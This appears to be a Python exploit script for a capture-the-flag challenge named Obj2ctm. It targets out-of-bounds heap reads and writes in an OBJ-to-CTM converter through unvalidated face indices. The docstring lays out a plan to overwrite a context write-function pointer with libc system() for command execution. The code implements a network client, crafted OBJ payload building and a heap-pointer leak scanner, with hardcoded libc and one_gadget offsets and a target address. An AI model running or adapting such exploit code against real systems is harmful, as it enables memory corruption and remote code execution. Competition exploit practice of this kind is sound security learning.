#!/usr/bin/env python3
"""
Exploit for Obj2ctm - CSCPT 2026 Quals
Vulnerability: Unvalidated face indices in libfastobj.so leading to OOB read/write.
The convert function has a swizzle bug: it uses texcoord index `t` to read from
texcoords array and position index `p` to write to texcoord_dst (UV map).

Since texcoords array is small and texcoord_dst is followed by ctm_context on the heap,
we can:
1. OOB READ: Read heap data beyond texcoords via large `t` values
2. OOB WRITE: Write to ctm_context fields via large `p` values

Target: Overwrite ctx->write_fn (+0x78) with system() and ctx->comment (+0x68) with a
        pointer to a command string stored in vertex data.
        When _ctmStreamWriteSTRING(ctx, ctx->comment) calls write_fn(cmd, len, user_data),
        it becomes system(cmd_string).
"""

import socket
import struct
import time
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else '178.105.86.125'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 26103

# Libc offsets (from libc.so.6, Ubuntu GLIBC 2.39-0ubuntu8.7)
LIBC_SYSTEM   = 0x58750
LIBC_BINSH    = 0x1cb42f
LIBC_OG_EF4CE = 0xef4ce  # one_gadget: execve("/bin/sh", rbp-0x50, r12)

# ============ Network ============

class Connection:
    def __init__(self):
        self.s = socket.socket()
        self.s.settimeout(10)
        self.s.connect((HOST, PORT))
    
    def send_obj(self, obj_data):
        """Send OBJ data and return CTM response."""
        self.s.sendall(struct.pack('<I', len(obj_data)) + obj_data)
        time.sleep(0.3)
        resp = b''
        while True:
            try:
                chunk = self.s.recv(4096)
                if not chunk: break
                resp += chunk
            except:
                break
        return resp
    
    def close(self):
        self.s.close()


# ============ OBJ Builder ============

def float_to_str(fval):
    """Convert float to string with enough precision for exact IEEE 754 round-trip."""
    # Use repr which gives exact representation in Python
    s = repr(fval)
    if '.' not in s and 'e' not in s and 'E' not in s:
        s += '.0'
    return s

def u32_to_float(u32):
    """Convert uint32 to float preserving bit pattern."""
    return struct.unpack('<f', struct.pack('<I', u32))[0]

def u64_to_floats(u64):
    """Convert uint64 to two float32 values preserving bit patterns."""
    lo = u64 & 0xFFFFFFFF
    hi = (u64 >> 32) & 0xFFFFFFFF
    return u32_to_float(lo), u32_to_float(hi)

def str_to_floats(s):
    """Encode a string as a sequence of floats (4 bytes per float, null padded to 4-byte boundary)."""
    s = s.encode() if isinstance(s, str) else s
    # Pad to 4-byte boundary
    padded = s + b'\x00' * ((4 - len(s) % 4) % 4)
    floats = []
    for i in range(0, len(padded), 4):
        u32 = struct.unpack('<I', padded[i:i+4])[0]
        floats.append(u32_to_float(u32))
    return floats

class OBJBuilder:
    def __init__(self):
        self.vertices = []
        self.texcoords = []
        self.normals = []
        self.faces = []
    
    def add_vertex(self, x, y, z):
        self.vertices.append((x, y, z))
    
    def add_texcoord(self, u, v=0.0):
        self.texcoords.append((u, v))
    
    def add_normal(self, nx, ny, nz):
        self.normals.append((nx, ny, nz))
    
    def add_face(self, indices):
        """indices: list of (p, t, n) or (p, t) or (p,) tuples"""
        self.faces.append(indices)
    
    def build(self):
        lines = []
        for v in self.vertices:
            lines.append(f'v {float_to_str(v[0])} {float_to_str(v[1])} {float_to_str(v[2])}')
        for tc in self.texcoords:
            lines.append(f'vt {float_to_str(tc[0])} {float_to_str(tc[1])}')
        for n in self.normals:
            lines.append(f'vn {float_to_str(n[0])} {float_to_str(n[1])} {float_to_str(n[2])}')
        for face in self.faces:
            parts = []
            for idx in face:
                if len(idx) == 3:
                    parts.append(f'{idx[0]}/{idx[1]}/{idx[2]}')
                elif len(idx) == 2:
                    parts.append(f'{idx[0]}/{idx[1]}')
                else:
                    parts.append(str(idx[0]))
            lines.append('f ' + ' '.join(parts))
        return '\n'.join(lines).encode()


# ============ CTM Parser ============

class CTMParser:
    def __init__(self, data):
        self.data = data
        self.off = 0
        self.vertex_count = 0
        self.triangle_count = 0
        self.indices = []
        self.vertices = []
        self.texc_raw = b''
        self._parse()
    
    def _read_u32(self):
        v = struct.unpack_from('<I', self.data, self.off)[0]
        self.off += 4
        return v
    
    def _parse(self):
        magic = self.data[self.off:self.off+4]
        if magic != b'OCTM':
            return
        self.off += 4
        
        self.fmt_ver    = self._read_u32()
        self.method     = self._read_u32()
        self.vertex_count = self._read_u32()
        self.triangle_count = self._read_u32()
        self.uv_count   = self._read_u32()
        self.attr_count = self._read_u32()
        self.flags      = self._read_u32()
        
        comment_len = self.data[self.off]
        self.off += 1
        self.comment = self.data[self.off:self.off+comment_len]
        self.off += comment_len
        self.off = (self.off + 3) & ~3
        
        # INDX
        tag = self.data[self.off:self.off+4]; self.off += 4
        if tag == b'INDX':
            for _ in range(self.triangle_count * 3):
                self.indices.append(self._read_u32())
        
        # VERT
        tag = self.data[self.off:self.off+4]; self.off += 4
        if tag == b'VERT':
            for _ in range(self.vertex_count * 3):
                self.vertices.append(struct.unpack_from('<f', self.data, self.off - 4 + 4 + _ * 4)[0])
            self.off += self.vertex_count * 3 * 4
        
        # TEXC
        if self.off < len(self.data):
            tag = self.data[self.off:self.off+4]
            if tag == b'TEXC':
                self.off += 4
                self.texc_raw = self.data[self.off:]
    
    def get_uv_u32(self):
        """Extract UV map uint32 values from the TEXC chunk.
        
        TEXC chunk structure:
        - uint32: element count or flags
        - null-terminated name string (e.g., "uv0")
        - padding to 4-byte alignment
        - float data (may be compressed, but for small data it's near-raw)
        """
        if len(self.texc_raw) < 8:
            return []
        raw = self.texc_raw
        # Find the name string (after the first uint32)
        # Name starts at offset 4
        if len(raw) <= 4:
            return []
        name_end = raw.find(b'\x00', 4)
        if name_end < 0:
            name_end = 4
        data_start = name_end + 1
        data_start = (data_start + 3) & ~3  # align
        uv_data = raw[data_start:]
        # Parse as uint32s
        count = len(uv_data) // 4
        if count == 0:
            return []
        u32s = struct.unpack(f'<{count}I', uv_data[:count*4])
        return list(u32s)


# ============ Leak Analysis ============

def try_leak(conn, obj_builder):
    """Send OBJ and parse leaked UV data."""
    obj = obj_builder.build()
    resp = conn.send_obj(obj)
    parser = CTMParser(resp)
    return parser


def scan_heap_for_pointers():
    """Scan the heap to find libc/heap pointers via OOB reads."""
    print("[*] Scanning heap for pointers...")
    
    # Strategy:
    # 1. Use minimal texcoords array (1 vt line = 2 floats = 8 bytes + header)
    # 2. Read at various t offsets to scan past texcoords into adjacent heap data
    # 3. Look for pointer-like values in the UV output
    
    vertices = [(42.0, 42.0, 42.0), (1.0, 0.0, 0.0), (0.0, 1.0, 0.0)]
    texcoords = [(0.0, 0.0)]  # minimal
    
    for t_val in [0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 15, 20, 30, 50]:
        conn = Connection()
        builder = OBJBuilder()
        for v in vertices:
            builder.add_vertex(*v)
        for tc in texcoords:
            builder.add_texcoord(*tc)
        # Face with controlled t for OOB read
        # p=1 puts the leaked data at uv0
        # Other two vertices use normal t=1
        builder.add_face([(1, t_val), (2, 1), (3, 1)])
        
        parser = try_leak(conn, builder)
        u32s = parser.get_uv_u32()
        conn.close()
        
        if u32s:
            nonzero = [(i, v) for i, v in enumerate(u32s) if v != 0]
            print(f"  t={t_val:4d}: {len(u32s)} u32s, non-zero: {len(nonzero)}")
            for idx, val in nonzero[:6]:
                print(f"    uv[{idx}] = 0x{val:08x}")
        else:
            print(f"  t={t_val:4d}: {len(u32s)} u32s")
    
    # For far OOB:
    for t_val in [100, 200, 500, 1000]:
        conn = Connection()
        builder = OBJBuilder()
        for v in vertices:
            builder.add_vertex(*v)
        for tc in texcoords:
            builder.add_texcoord(*tc)
        builder.add_face([(1, t_val), (2, 1), (3, 1)])
        
        parser = try_leak(conn, builder)
        u32s = parser.get_uv_u32()
        conn.close()
        
        if u32s:
            nonzero = [(i, v) for i, v in enumerate(u32s) if v != 0]
            print(f"  t={t_val:4d}: {len(u32s)} u32s, non-zero: {len(nonzero)}")
            for idx, val in nonzero[:10]:
                print(f"    uv[{idx}] = 0x{val:08x}")
        else:
            print(f"  t={t_val:4d}: {len(u32s)} u32s")


if __name__ == '__main__':
    scan_heap_for_pointers()
